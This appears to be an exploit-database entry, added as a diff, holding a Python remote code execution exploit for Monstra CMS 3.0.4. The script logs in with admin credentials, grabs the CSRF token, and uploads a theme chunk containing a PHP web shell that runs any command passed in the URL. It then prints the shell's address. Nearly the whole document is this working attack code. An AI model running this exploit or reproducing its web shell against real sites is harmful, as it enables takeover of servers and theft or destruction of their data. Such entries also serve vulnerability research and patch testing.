@@ -1,0 +1,100 @@
+id: 39643
+date: 06/04/2024
+title: Monstra CMS 3.0.4 - Remote Code Execution Exploit
+author: Ahmet Ümit BAYRAM
+cves: 
+
+# Exploit Title: Monstra CMS 3.0.4 - Remote Code Execution (RCE)
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://monstra.org/
+# Software Link: https://monstra.org/monstra-3.0.4.zip
+# Version: 3.0.4
+# Tested on: MacOS
+
+import requests
+import random
+import string
+import time
+import re
+import sys
+
+if len(sys.argv) < 4:
+print("Usage: python3 script.py <url> <username> <password>")
+sys.exit(1)
+
+base_url = sys.argv[1]
+username = sys.argv[2]
+password = sys.argv[3]
+
+session = requests.Session()
+
+login_url = f'{base_url}/admin/index.php?id=dashboard'
+login_data = {
+'login': username,
+'password': password,
+'login_submit': 'Log+In'
+}
+
+filename = ''.join(random.choices(string.ascii_lowercase + string.digits, k=
+5))
+
+print("Logging in...")
+response = session.post(login_url, data=login_data)
+
+if 'Dashboard' in response.text:
+print("Login successful")
+else:
+print("Login failed")
+exit()
+
+time.sleep(3)
+
+edit_url = f'{base_url}/admin/index.php?id=themes&action=add_chunk'
+response = session.get(edit_url) # CSRF token bulmak için edit sayfasına
+erişim
+
+token_search = re.search(r'input type="hidden" id="csrf" name="csrf" value="
+(.*?)"', response.text)
+if token_search:
+token = token_search.group(1)
+else:
+print("CSRF token could not be found.")
+exit()
+
+content = '''
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+if(isset($_GET['cmd']))
+{
+system($_GET['cmd']);
+}
+?>
+</pre>
+</body>
+</html>
+'''
+
+edit_data = {
+'csrf': token,
+'name': filename,
+'content': content,
+'add_file': 'Save'
+}
+
+print("Preparing shell...")
+response = session.post(edit_url, data=edit_data)
+time.sleep(3)
+
+if response.status_code == 200:
+print(f"Your shell is ready: {base_url}/public/themes/default/{filename}
+.chunk.php")
+else:
+print("Failed to prepare shell.")
+
+#  0day.today [2024-06-15]  #
